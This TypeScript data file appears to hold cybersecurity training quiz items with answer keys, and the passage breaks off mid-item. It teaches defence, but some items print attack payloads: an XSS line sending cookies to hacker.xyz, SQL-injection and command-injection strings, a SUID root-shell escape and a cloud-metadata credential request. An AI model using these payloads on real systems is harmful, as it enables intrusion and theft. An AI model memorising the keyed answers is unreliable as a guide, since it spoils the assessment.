import { HardcoreQuestion } from '../types';
import { shuffleArray } from '../utils/shuffle';
import { getSavedLanguage, Language } from '../utils/language';

// ==========================================
// ENGLISH DIAGNOSTIC QUESTIONS POOL
// ==========================================

export const BEGINNER_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
  {
    id: 'diag_beg_mfa',
    title: 'Identity Defense: Two-Factor Auth',
    type: 'multiple_choice',
    domain: 'Cryptography',
    difficulty: 'Beginner',
    prompt: 'Why is Multi-Factor Authentication (MFA) critical even when an operator uses a complex password?',
    codeSnippet: 'LOGIN ATTEMPT:\nUsername: admin\nPassword: ********** [MATCH]\nMFA OTP Code: ???',
    options: [
      { id: 'bm_opt1', text: 'Blocks login even if password is leaked in a breach', isCorrect: true, explanation: 'MFA requires a second proof of identity (TOTP/token), preventing credential reuse.' },
      { id: 'bm_opt2', text: 'Accelerates network connection download speeds', isCorrect: false },
      { id: 'bm_opt3', text: 'Removes the need for host endpoint antivirus', isCorrect: false },
      { id: 'bm_opt4', text: 'Physically encrypts the local hardware drive', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'NIST SP 800-63B: Digital Identity Guidelines',
      whyItWorks: 'Credential theft alone is insufficient to compromise accounts protected by out-of-band MFA.',
      patchRecommendation: 'Enforce hardware FIDO2 or TOTP authenticator app tokens across all corporate accounts.',
      terminalProof: '$ pam_authenticate(user, PAM_DISALLOW_NULL_AUTHTOK)\n[2FA Required: Challenge Sent]'
    },
    xpReward: 30,
    eloReward: 15
  },
  {
    id: 'diag_beg_phishing_link',
    title: 'Threat Detection: Spoofed URL',
    type: 'multiple_choice',
    domain: 'Defense & SOC',
    difficulty: 'Beginner',
    prompt: 'An urgent security notice arrives by email. Which destination URL indicates an active phishing campaign?',
    codeSnippet: 'EMAIL SENDER: Security Team <alert@corporate-update.org>\nACTION: Verify your credentials immediately',
    options: [
      { id: 'bp_opt1', text: 'https://login-micros0ft.support-verify.com', isCorrect: true, explanation: 'The domain is support-verify.com with a typo-squatted subdomain mimicking Microsoft.' },
      { id: 'bp_opt2', text: 'https://account.microsoft.com/security', isCorrect: false },
      { id: 'bp_opt3', text: 'https://login.live.com/oauth2', isCorrect: false },
      { id: 'bp_opt4', text: 'https://portal.office.com/landing', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'MITRE ATT&CK T1566: Phishing & Typo-Squatting',
      whyItWorks: 'Attackers register look-alike domains to deceive users into submitting corporate credentials.',
      patchRecommendation: 'Inspect the root domain before entering credentials and configure email DMARC policies.',
      terminalProof: '$ whois support-verify.com\nCreation Date: 2026-10-17 (Registered 24h ago)'
    },
    xpReward: 30,
    eloReward: 15
  },
  {
    id: 'diag_beg_polp',
    title: 'Access Control: Least Privilege',
    type: 'multiple_choice',
    domain: 'Linux & Bash',
    difficulty: 'Beginner',
    prompt: 'What does the Principle of Least Privilege (PoLP) dictate in secure architecture?',
    codeSnippet: 'ACCESS MATRIX:\nOperator: Developer\nRequested: Domain Admin (Full Root)\nPolicy: ???',
    options: [
      { id: 'bl_opt1', text: 'Grant only minimum permissions required for duties', isCorrect: true, explanation: 'Restricting permissions minimizes blast radius if an individual account is compromised.' },
      { id: 'bl_opt2', text: 'Give root administrative access to all employees', isCorrect: false },
      { id: 'bl_opt3', text: 'Share one master password across entire departments', isCorrect: false },
      { id: 'bl_opt4', text: 'Disable firewall rules to accelerate engineering work', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Principle of Least Privilege (PoLP)',
      whyItWorks: 'Limiting permissions contains compromised accounts and prevents lateral network movement.',
      patchRecommendation: 'Implement Role-Based Access Control (RBAC) with Just-In-Time (JIT) privilege elevation.',
      terminalProof: '$ sudo -l\nUser operator may run the following: (root) /usr/bin/journalctl'
    },
    xpReward: 30,
    eloReward: 15
  },
  {
    id: 'diag_beg_malware_ext',
    title: 'Endpoint Security: Suspicious Payload',
    type: 'multiple_choice',
    domain: 'Code Analysis',
    difficulty: 'Beginner',
    prompt: 'An unexpected archive arrives via email. Which filename represents a dangerous hidden executable payload?',
    codeSnippet: 'ARCHIVE CONTENTS:\n[1] README.txt\n[2] Contract.pdf\n[3] Invoice_Payment.pdf.exe\n[4] Logo.png',
    options: [
      { id: 'bx_opt1', text: 'Invoice_Payment.pdf.exe (executable payload)', isCorrect: true, explanation: 'Double extensions trick OS file managers while Windows executes the file as a PE binary.' },
      { id: 'bx_opt2', text: 'Contract.pdf (document)', isCorrect: false },
      { id: 'bx_opt3', text: 'README.txt (text file)', isCorrect: false },
      { id: 'bx_opt4', text: 'Logo.png (image)', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Double Extension Masquerading (MITRE T1036.007)',
      whyItWorks: 'When file extensions are hidden, users only see .pdf while the OS executes .exe code.',
      patchRecommendation: 'Configure OS to always show file extensions and block executable extensions at mail gateway.',
      terminalProof: '$ file Invoice_Payment.pdf.exe\nPE32 executable (GUI) Intel 80386, for MS Windows'
    },
    xpReward: 30,
    eloReward: 15
  },
  {
    id: 'diag_beg_firewall',
    title: 'Perimeter Defense: Packet Filtering',
    type: 'multiple_choice',
    domain: 'Networking',
    difficulty: 'Beginner',
    prompt: 'What is the primary operational role of an enterprise network firewall?',
    codeSnippet: 'INCOMING TCP PACKET -> [FIREWALL ACL] -> LOCAL HOST',
    options: [
      { id: 'bf_opt1', text: 'Filter and block unauthorized network connections', isCorrect: true, explanation: 'Firewalls inspect packet headers and drop traffic that violates defined security policies.' },
      { id: 'bf_opt2', text: 'Double broadband transmission download speed', isCorrect: false },
      { id: 'bf_opt3', text: 'Store relational SQL database transaction logs', isCorrect: false },
      { id: 'bf_opt4', text: 'Automatically update browser search history', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Stateful Packet Inspection (SPI)',
      whyItWorks: 'Firewalls enforce access control lists (ACLs) to segregate trusted and untrusted network zones.',
      patchRecommendation: 'Implement default-deny ingress rules, only exposing strictly required public services.',
      terminalProof: '$ sudo iptables -L -n -v\nChain INPUT (policy DROP)'
    },
    xpReward: 30,
    eloReward: 15
  },
  {
    id: 'diag_beg_social_eng',
    title: 'Human Factors: Social Engineering',
    type: 'multiple_choice',
    domain: 'Defense & SOC',
    difficulty: 'Beginner',
    prompt: 'How is Social Engineering defined in modern offensive cybersecurity?',
    codeSnippet: 'CALLER: "Hello, this is IT Helpdesk. We need your VPN PIN for maintenance."',
    options: [
      { id: 'bs_opt1', text: 'Psychological manipulation to trick victims into revealing secrets', isCorrect: true, explanation: 'Attackers exploit human trust, urgency, or authority rather than technical software bugs.' },
      { id: 'bs_opt2', text: 'Hardware overheating inside server cooling systems', isCorrect: false },
      { id: 'bs_opt3', text: 'Automated compilation of Linux operating systems', isCorrect: false },
      { id: 'bs_opt4', text: 'Measuring physical Wi-Fi signal attenuation over distance', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Social Engineering & Pretexting (MITRE T1566)',
      whyItWorks: 'Human operators are often the weakest link when subjected to fabricated urgency or authority.',
      patchRecommendation: 'Establish mandatory out-of-band verification procedures before releasing credentials.',
      terminalProof: '[VOICE LOG: Caller impersonated Director to extract password reset]'
    },
    xpReward: 30,
    eloReward: 15
  }
];

export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
  {
    id: 'diag_int_1_sqli',
    title: 'Web Security: SQL Injection Analysis',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Intermediate',
    prompt: 'Which payload string causes the authentication logic bypass in the raw HTTP request below?',
    codeSnippet: 'POST /api/v1/auth/session HTTP/1.1\n{"username": "admin\' OR 1=1-- -", "pass": "x"}',
    options: [
      { id: 'i1_opt1', text: 'Tautology: "OR 1=1" forces WHERE clause to evaluate TRUE', isCorrect: true, explanation: 'The injected condition renders the query true, and comments discard the remaining password check.' },
      { id: 'i1_opt2', text: 'JSON key "pass" is bypassed via HTTP smuggling', isCorrect: false },
      { id: 'i1_opt3', text: 'Port 8443 transmits unencrypted session cookies', isCorrect: false },
      { id: 'i1_opt4', text: 'Content-Length header triggers buffer overrun', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-89: SQL Injection',
      whyItWorks: 'Direct string concatenation allows user input to break out of data context into code syntax.',
      patchRecommendation: 'Use parameterized queries (Prepared Statements) with bound parameters.',
      terminalProof: '$ curl -X POST -d \'{"username":"admin\'\\\'\' OR 1=1-- -"}\' https://target.corp/login\nHTTP/1.1 200 OK'
    },
    xpReward: 50,
    eloReward: 25
  },
  {
    id: 'diag_int_2_networking',
    title: 'Packet Dissection: TCP Port State',
    type: 'multiple_choice',
    domain: 'Networking',
    difficulty: 'Intermediate',
    prompt: 'During a SYN scan (-sS), the target responds with [RST, ACK]. What port state does this indicate?',
    codeSnippet: 'FRAME: TCP 10.10.10.50:443 -> 192.168.1.15\nFlags: [RST, ACK], Seq=0, Ack=1',
    options: [
      { id: 'i2_opt1', text: 'CLOSED (Host reachable, actively rejects connection)', isCorrect: true, explanation: 'An RST/ACK packet indicates the host OS is active but no service is bound to that port.' },
      { id: 'i2_opt2', text: 'OPEN (Listening for TLS ClientHello)', isCorrect: false },
      { id: 'i2_opt3', text: 'FILTERED (Firewall dropped inbound packet)', isCorrect: false },
      { id: 'i2_opt4', text: 'Active ARP cache poisoning detected', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'RFC 793 TCP Port States',
      whyItWorks: 'In SYN scanning, open ports respond with SYN/ACK, while closed ports immediately reply with RST/ACK.',
      patchRecommendation: 'Configure firewalls to silently DROP unauthorized packets instead of replying with RST.',
      terminalProof: '$ nmap -sS -p 443 10.10.10.50\n443/tcp closed https'
    },
    xpReward: 50,
    eloReward: 25
  },
  {
    id: 'diag_int_3_linux',
    title: 'Privilege Escalation: SUID Binary',
    type: 'multiple_choice',
    domain: 'Linux & Bash',
    difficulty: 'Intermediate',
    prompt: 'Why does the binary below permit immediate privilege escalation to root?',
    codeSnippet: '$ ls -la /usr/bin/find\n-rwsr-xr-x 1 root root 224840 May 12 /usr/bin/find',
    options: [
      { id: 'i3_opt1', text: 'SUID bit set ("s"): executes with effective root UID', isCorrect: true, explanation: 'The SUID permission causes the process to run with the permissions of its owner (root).' },
      { id: 'i3_opt2', text: 'File has world-writable write permissions', isCorrect: false },
      { id: 'i3_opt3', text: 'Encrypted binary decryptable only via kernel keyring', isCorrect: false },
      { id: 'i3_opt4', text: 'Execute-only flags prevent disassembly analysis', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'SUID Privilege Escalation (GTFOBins)',
      whyItWorks: 'find with SUID can execute arbitrary shell commands via the -exec argument as root.',
      patchRecommendation: 'Remove unnecessary SUID bits with `chmod u-s /usr/bin/find`.',
      terminalProof: '$ /usr/bin/find . -exec /bin/sh -p \\;\n# whoami\nroot'
    },
    xpReward: 50,
    eloReward: 25
  },
  {
    id: 'diag_int_4_jwt',
    title: 'Authentication: JWT Verification',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Intermediate',
    prompt: 'What architectural vulnerability allows an attacker to forge arbitrary JSON Web Tokens (JWT)?',
    codeSnippet: 'HEADER: {"alg": "none", "typ": "JWT"}\nPAYLOAD: {"user": "admin", "role": "root"}',
    options: [
      { id: 'i4_opt1', text: 'Accepting "alg": "none" without signature verification', isCorrect: true, explanation: 'The "none" algorithm instructs vulnerable libraries to skip cryptographic verification.' },
      { id: 'i4_opt2', text: 'Payload is stored unencrypted in Base64', isCorrect: false },
      { id: 'i4_opt3', text: 'Tokens missing mandatory "exp" expiration claim', isCorrect: false },
      { id: 'i4_opt4', text: 'HMAC keys requiring RSA public certificates', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'JWT Alg None Vulnerability (RFC 7519)',
      whyItWorks: 'If the server trusts the header alg parameter blindly, attackers remove the signature and gain full access.',
      patchRecommendation: 'Explicitly enforce allowed signature algorithms (e.g. RS256) and reject "none".',
      terminalProof: '$ python3 -c "import jwt; jwt.decode(token, algorithms=[\'RS256\'])"'
    },
    xpReward: 50,
    eloReward: 25
  },
  {
    id: 'diag_int_5_xss',
    title: 'Client-Side Exploitation: XSS Variants',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Intermediate',
    prompt: 'What distinguishes Stored XSS (Persistent) from Reflected XSS?',
    codeSnippet: 'STORED: <script>fetch("http://hacker.xyz/?c="+document.cookie)</script>',
    options: [
      { id: 'i5_opt1', text: 'Payload is saved in backend database and affects all visitors', isCorrect: true, explanation: 'Stored XSS persists in server-side storage and automatically executes for any user viewing the page.' },
      { id: 'i5_opt2', text: 'Stored XSS only executes inside the browser developer console', isCorrect: false },
      { id: 'i5_opt3', text: 'Reflected XSS permanently alters server filesystem files', isCorrect: false },
      { id: 'i5_opt4', text: 'Stored XSS is automatically sanitized by TLS certificates', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-79: Cross-Site Scripting (XSS)',
      whyItWorks: 'Unsanitized user inputs stored in databases are rendered directly into HTML without contextual encoding.',
      patchRecommendation: 'Apply contextual HTML/JS output encoding and implement a strict Content-Security-Policy (CSP).',
      terminalProof: 'alert(document.domain)'
    },
    xpReward: 50,
    eloReward: 25
  },
  {
    id: 'diag_int_6_cidr',
    title: 'Network Addressing: IPv4 Subnetting',
    type: 'multiple_choice',
    domain: 'Networking',
    difficulty: 'Intermediate',
    prompt: 'In standard IPv4 CIDR notation, how many assignable host addresses are available in a /24 subnet?',
    codeSnippet: 'NETWORK: 192.168.1.0/24\nNETMASK: 255.255.255.0',
    options: [
      { id: 'i6_opt1', text: '254 usable host addresses (256 minus network & broadcast)', isCorrect: true, explanation: 'A /24 subnet has 2^(32-24) = 256 addresses; subtracting network (.0) and broadcast (.255) leaves 254.' },
      { id: 'i6_opt2', text: '256 usable host addresses', isCorrect: false },
      { id: 'i6_opt3', text: '512 usable host addresses', isCorrect: false },
      { id: 'i6_opt4', text: '128 usable host addresses', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'RFC 4632 Classless Inter-Domain Routing',
      whyItWorks: 'The first address represents the network wire and the last is reserved for broadcast transmissions.',
      patchRecommendation: 'Calculate network boundaries accurately to prevent address overlapping in VPC architectures.',
      terminalProof: '$ ipcalc 192.168.1.0/24 | grep Hosts\nHosts/Net: 254'
    },
    xpReward: 50,
    eloReward: 25
  }
];

export const ADVANCED_DIAGNOSTIC_QUESTIONS_EN: HardcoreQuestion[] = [
  {
    id: 'diag_adv_1_idor',
    title: 'Access Control: IDOR Vulnerability',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Zero-Day',
    prompt: 'An attacker modifies `user_id=104` to `user_id=1` in an API call and receives the CEO payroll. What flaw is this?',
    codeSnippet: 'GET /api/v2/payroll?user_id=1 HTTP/1.1\nCookie: session=operator_104_token\n\nHTTP/1.1 200 OK\n{"salary": 250000, "name": "CEO"}',
    options: [
      { id: 'a1_opt1', text: 'IDOR: Horizontal access control missing server-side authorization check', isCorrect: true, explanation: 'The backend trusted the user-supplied identifier without validating ownership against the session.' },
      { id: 'a1_opt2', text: 'Reflected Cross-Site Scripting (XSS) in query string', isCorrect: false },
      { id: 'a1_opt3', text: 'SQL Injection via JSON body parsing', isCorrect: false },
      { id: 'a1_opt4', text: 'Buffer overflow on stack pointer register', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-639: Insecure Direct Object Reference (IDOR)',
      whyItWorks: 'Direct parameter references exposed without object-level permissions allow unauthorized data access.',
      patchRecommendation: 'Validate that the requesting session has explicit rights to access the specified record.',
      terminalProof: '$ curl -H "Cookie: session=attacker" https://target.corp/api/doc/1\nHTTP/1.1 200 OK'
    },
    xpReward: 70,
    eloReward: 35
  },
  {
    id: 'diag_adv_2_rce',
    title: 'Code Execution: Shell Injection',
    type: 'multiple_choice',
    domain: 'Code Analysis',
    difficulty: 'Zero-Day',
    prompt: 'Why does the PHP script below allow Remote Code Execution (RCE)?',
    codeSnippet: '<?php\n$host = $_GET["target"];\nsystem("ping -c 2 " . $host);\n?>',
    options: [
      { id: 'a2_opt1', text: 'Unsanitized input concatenated into system() allows command chaining (e.g. ; id)', isCorrect: true, explanation: 'Shell metacharacters like ; & | allow attackers to append arbitrary system commands.' },
      { id: 'a2_opt2', text: 'File upload without MIME verification', isCorrect: false },
      { id: 'a2_opt3', text: 'Insecure Python pickle object deserialization', isCorrect: false },
      { id: 'a2_opt4', text: 'Format string memory corruption in printf', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-78: OS Command Injection',
      whyItWorks: 'Passing user input directly to a system shell invokes /bin/sh, parsing metacharacters as new commands.',
      patchRecommendation: 'Use escapeshellarg() or avoid shell invocation by using native socket libraries.',
      terminalProof: '$ curl "https://target.corp/ping.php?target=127.0.0.1;id"\nuid=33(www-data) gid=33(www-data)'
    },
    xpReward: 70,
    eloReward: 35
  },
  {
    id: 'diag_adv_3_pwn',
    title: 'Binary Exploitation: Stack Corruption',
    type: 'multiple_choice',
    domain: 'Code Analysis',
    difficulty: 'Zero-Day',
    prompt: 'In an x86_64 stack buffer overflow, which CPU register is overwritten to hijack execution flow?',
    codeSnippet: '[Buffer 64 bytes] -> [Saved RBP 8 bytes] -> [RETURN ADDRESS (RIP)]',
    options: [
      { id: 'a3_opt1', text: 'RIP (Instruction Pointer / Return Address)', isCorrect: true, explanation: 'Overwriting the return address causes the RET instruction to jump to attacker-controlled memory.' },
      { id: 'a3_opt2', text: 'RSP (Stack Pointer Register)', isCorrect: false },
      { id: 'a3_opt3', text: 'RAX (General Purpose Accumulator)', isCorrect: false },
      { id: 'a3_opt4', text: 'RFLAGS (CPU Flag Register)', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-121: Stack-based Buffer Overflow',
      whyItWorks: 'Unchecked memory copy operations corrupt the return address on the stack frame.',
      patchRecommendation: 'Compile with Stack Canaries (-fstack-protector-all), ASLR, and DEP/NX enabled.',
      terminalProof: 'Program received signal SIGSEGV, Segmentation fault.\n0x4141414141414141 in ?? ()'
    },
    xpReward: 70,
    eloReward: 35
  },
  {
    id: 'diag_adv_4_ssrf',
    title: 'Cloud Security: Server-Side Request Forgery',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Zero-Day',
    prompt: 'In a cloud environment (AWS/GCP), what is the most critical target of an SSRF vulnerability?',
    codeSnippet: 'POST /api/fetch_avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    options: [
      { id: 'a4_opt1', text: 'Instance Metadata Service (IMDS) exposing temporary IAM credentials', isCorrect: true, explanation: 'The link-local metadata IP yields IAM role tokens, allowing full infrastructure takeover.' },
      { id: 'a4_opt2', text: 'Client browser history and cached cookies', isCorrect: false },
      { id: 'a4_opt3', text: 'Local DNS cache poisoning on client WiFi', isCorrect: false },
      { id: 'a4_opt4', text: 'Exhaustion of physical router MAC tables', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-918: Server-Side Request Forgery (SSRF)',
      whyItWorks: 'Applications fetching remote URLs without IP allowlisting query link-local cloud metadata services.',
      patchRecommendation: 'Enforce IMDSv2 requiring token headers and block egress to 169.254.169.254.',
      terminalProof: '$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role'
    },
    xpReward: 70,
    eloReward: 35
  },
  {
    id: 'diag_adv_5_aslr',
    title: 'Exploit Mitigations: Memory Randomization',
    type: 'multiple_choice',
    domain: 'Defense & SOC',
    difficulty: 'Zero-Day',
    prompt: 'What defense mechanism does Address Space Layout Randomization (ASLR) provide against buffer overflows?',
    codeSnippet: 'RUN 1: libc base = 0x7f81a2000000\nRUN 2: libc base = 0x7f43b8c00000',
    options: [
      { id: 'a5_opt1', text: 'Randomizes memory offsets of stack, heap, and libraries on each run', isCorrect: true, explanation: 'ASLR prevents attackers from reliably jumping to static function addresses or ROP gadgets.' },
      { id: 'a5_opt2', text: 'Makes stack memory strictly read-only', isCorrect: false },
      { id: 'a5_opt3', text: 'Cryptographically signs compiled executable binaries', isCorrect: false },
      { id: 'a5_opt4', text: 'Disables all relative pointer arithmetic in CPU', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Mitigation: ASLR & PIE (Position Independent Executable)',
      whyItWorks: 'Without predictable addresses, standard return-to-libc and ROP chains trigger segmentation faults.',
      patchRecommendation: 'Ensure PIE is enabled (-fPIE -pie) alongside kernel ASLR (kernel.randomize_va_space = 2).',
      terminalProof: '$ sysctl kernel.randomize_va_space\nkernel.randomize_va_space = 2'
    },
    xpReward: 70,
    eloReward: 35
  },
  {
    id: 'diag_adv_6_cors',
    title: 'Web APIs: Misconfigured Cross-Origin Sharing',
    type: 'multiple_choice',
    domain: 'Web Sec',
    difficulty: 'Zero-Day',
    prompt: 'Why is `Access-Control-Allow-Origin: null` with `Credentials: true` a severe security risk?',
    codeSnippet: 'HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true',
    options: [
      { id: 'a6_opt1', text: 'Sandboxed iframes generate Origin "null", allowing cross-origin credential leaks', isCorrect: true, explanation: 'Any attacker can embed a sandboxed iframe to trigger Origin: null and steal authenticated session data.' },
      { id: 'a6_opt2', text: 'It completely disables TLS certificate validation in browsers', isCorrect: false },
      { id: 'a6_opt3', text: 'It forces client browsers to execute server shell scripts', isCorrect: false },
      { id: 'a6_opt4', text: 'It prevents valid users from submitting forms', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'CWE-942: Overly Permissive CORS Policy',
      whyItWorks: 'Origin: null can be triggered by attackers using sandboxed iframes or data: URIs.',
      patchRecommendation: 'Never reflect Origin: null with credentials; validate origin against an explicit trusted whitelist.',
      terminalProof: '<iframe sandbox="allow-scripts allow-top-navigation" src="..."></iframe>'
    },
    xpReward: 70,
    eloReward: 35
  }
];

// ==========================================
// ITALIAN DIAGNOSTIC QUESTIONS POOL (LOCALIZED)
// ==========================================

export const BEGINNER_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
  {
    id: 'diag_beg_mfa',
    title: 'Difesa Identità: Autenticazione a Due Fattori',
    type: 'multiple_choice',
    domain: 'Cryptography',
    difficulty: 'Beginner',
    prompt: 'Perché l\'autenticazione a due fattori (MFA) è fondamentale anche se si usa una password complessa?',
    codeSnippet: 'TENTATIVO DI ACCESSO:\nUsername: admin\nPassword: ********** [CORRETTA]\nCodice OTP MFA: ???',
    options: [
      { id: 'bm_opt1', text: 'Blocca l\'accesso anche se la password viene rubata in un leak', isCorrect: true, explanation: 'L\'MFA richiede una seconda prova di identità (token TOTP), impedendo l\'uso illecito delle credenziali.' },
      { id: 'bm_opt2', text: 'Velocizza il download della connessione internet', isCorrect: false },
      { id: 'bm_opt3', text: 'Elimina del tutto la necessità di avere un antivirus', isCorrect: false },
      { id: 'bm_opt4', text: 'Formatta automaticamente la memoria RAM a ogni riavvio', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Linee Guida Identità Digitale NIST SP 800-63B',
      whyItWorks: 'Il solo furto delle credenziali non basta a compromettere gli account protetti da MFA fuori banda.',
      patchRecommendation: 'Imporre l\'autenticazione a due fattori (FIDO2 o app TOTP) su tutti gli account operatore.',
      terminalProof: '$ pam_authenticate(user, PAM_DISALLOW_NULL_AUTHTOK)\n[2FA Required: Challenge Inviata]'
    },
    xpReward: 30,
    eloReward: 15
  },
  {
    id: 'diag_beg_phishing_link',
    title: 'Rilevamento Minacce: URL Contraffatto',
    type: 'multiple_choice',
    domain: 'Defense & SOC',
    difficulty: 'Beginner',
    prompt: 'Ricevi un avviso urgente di sicurezza via email. Quale URL indica un tentativo di phishing con dominio contraffatto?',
    codeSnippet: 'MITTENTE: Team Sicurezza <alert@aggiornamento-sistema.org>\nAZIONE RICHIESTA: Verifica subito le tue credenziali',
    options: [
      { id: 'bp_opt1', text: 'https://login-micros0ft.supporto-verifica.com', isCorrect: true, explanation: 'Il dominio effettivo è supporto-verifica.com con un sottodominio fraudolento che imita Microsoft.' },
      { id: 'bp_opt2', text: 'https://account.microsoft.com/security', isCorrect: false },
      { id: 'bp_opt3', text: 'https://login.live.com/oauth2', isCorrect: false },
      { id: 'bp_opt4', text: 'https://portal.office.com/landing', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'MITRE ATT&CK T1566: Phishing & Typo-Squatting',
      whyItWorks: 'Gli attaccanti registrano domini simili per ingannare le vittime e catturare credenziali aziendali.',
      patchRecommendation: 'Controllare sempre il dominio radice prima di inserire credenziali e abilitare policy DMARC.',
      terminalProof: '$ whois supporto-verifica.com\nData Creazione: 2026-10-17 (Registrato 24 ore fa)'
    },
    xpReward: 30,
    eloReward: 15
  },
  {
    id: 'diag_beg_polp',
    title: 'Controllo Accessi: Minimo Privilegio',
    type: 'multiple_choice',
    domain: 'Linux & Bash',
    difficulty: 'Beginner',
    prompt: 'Cosa stabilisce il Principio del Minimo Privilegio (Principle of Least Privilege)?',
    codeSnippet: 'MATRICE PRIVILEGI:\nOperatore: Sviluppatore Junior\nRichiesto: Domain Admin (Root Totale)\nPolicy di Sicurezza: ???',
    options: [
      { id: 'bl_opt1', text: 'Assegnare solo i permessi strettamente necessari alle proprie mansioni', isCorrect: true, explanation: 'Limitare i permessi riduce il raggio d\'impatto nel caso in cui un singolo account venga violato.' },
      { id: 'bl_opt2', text: 'Concedere accesso di root amministratore a qualsiasi dipendente', isCorrect: false },
      { id: 'bl_opt3', text: 'Condividere una singola password master per tutti gli uffici', isCorrect: false },
      { id: 'bl_opt4', text: 'Disattivare i firewall per non rallentare il lavoro di programmazione', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Principio del Minimo Privilegio (PoLP)',
      whyItWorks: 'Limitare i permessi contiene l\'attacco ed evita il movimento laterale nella rete aziendale.',
      patchRecommendation: 'Adottare il controllo accessi basato su ruoli (RBAC) e privilegi Just-In-Time.',
      terminalProof: '$ sudo -l\nUser operator may run the following: (root) /usr/bin/journalctl'
    },
    xpReward: 30,
    eloReward: 15
  },
  {
    id: 'diag_beg_malware_ext',
    title: 'Sicurezza Endpoint: Allegato Sospetto',
    type: 'multiple_choice',
    domain: 'Code Analysis',
    difficulty: 'Beginner',
    prompt: 'Ricevi un archivio inatteso via email. Quale nome di file nasconde un payload eseguibile malevolo?',
    codeSnippet: 'CONTENUTO ARCHIVIO:\n[1] README.txt\n[2] Contratto.pdf\n[3] Fattura_Pagamento.pdf.exe\n[4] Logo.png',
    options: [
      { id: 'bx_opt1', text: 'Fattura_Pagamento.pdf.exe (payload eseguibile)', isCorrect: true, explanation: 'La doppia estensione inganna l\'utente mentre Windows esegue il file come programma PE.' },
      { id: 'bx_opt2', text: 'Contratto.pdf (documento)', isCorrect: false },
      { id: 'bx_opt3', text: 'README.txt (file di testo)', isCorrect: false },
      { id: 'bx_opt4', text: 'Logo.png (immagine)', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Doppia Estensione Masquerading (MITRE T1036.007)',
      whyItWorks: 'Quando le estensioni note sono nascoste, l\'utente vede .pdf ma il sistema lancia il file .exe.',
      patchRecommendation: 'Configurare il sistema operativo per mostrare sempre le estensioni e bloccare gli .exe via mail.',
      terminalProof: '$ file Fattura_Pagamento.pdf.exe\nPE32 executable (GUI) Intel 80386, for MS Windows'
    },
    xpReward: 30,
    eloReward: 15
  },
  {
    id: 'diag_beg_firewall',
    title: 'Difesa Perimetrale: Filtraggio Pacchetti',
    type: 'multiple_choice',
    domain: 'Networking',
    difficulty: 'Beginner',
    prompt: 'Qual è la funzione operativa fondamentale di un firewall di rete aziendale?',
    codeSnippet: 'PACCHETTO IN ENTRATA -> [REGOLE ACL FIREWALL] -> SERVER AZIENDALE',
    options: [
      { id: 'bf_opt1', text: 'Filtrare e bloccare il traffico di rete non autorizzato', isCorrect: true, explanation: 'Il firewall ispeziona i pacchetti e scarta il traffico che viola le policy di sicurezza impostate.' },
      { id: 'bf_opt2', text: 'Raddoppiare la velocità di download della fibra ottica', isCorrect: false },
      { id: 'bf_opt3', text: 'Memorizzare i registri delle transazioni del database SQL', isCorrect: false },
      { id: 'bf_opt4', text: 'Aggiornare automaticamente la cronologia del browser', isCorrect: false }
    ],
    rootCauseBreakdown: {
      cveOrTopic: 'Stateful Packet Inspection (SPI)',
      whyItWorks: 'Il firewall applica liste di controllo accessi (ACL) separando zone fidate da reti ostili.',
      patchRecommendation: 'Configurare policy default-deny, aprendo solo le porte rigorosamente necessarie.',
      terminalProof: '$ sudo iptables -L -n -v\nChain INPUT (policy DROP)'
    },
    xpReward: 30,
    eloReward: 15
  },
  {
    id: 'diag_beg_social_eng',
    title: 'Fattore Umano: Ingegneria Sociale',
    type: 'multiple_choice',
    domain: 'Defense & SOC',
    difficulty: 'Beginner',
    prompt: 'Come viene definita l\'Ingegneria Sociale (Social Engineering) nella sicurezza moderna?',
    codeSnippet: 'CHIAMATA: "Buongiorno, sono dell\'Helpdesk IT. Ho urgenza del suo PIN VPN per manutenzione."',
    options: [
      { id: 'bs_opt1', text: 'Manipolazione psicologica per indurre la vittima a rivelare segreti', isCorrect: true, explanation: 'Gli attaccanti sfruttano fiducia, urgenza o autorità apparente invece di bug nel software.' },
      { id: 'bs_opt2', text: 'Surriscaldamento dei componenti hardware nei server', isCorrect: false },
      { id: 'bs_opt3', text: 'Compilazione automatizzata del kernel di Linux', isCorrect: false },
      { id: 'bs_opt4', text: 'Misurazione della dispersione del segnale Wi-Fi a distanza', isCorrect: false }
    ],
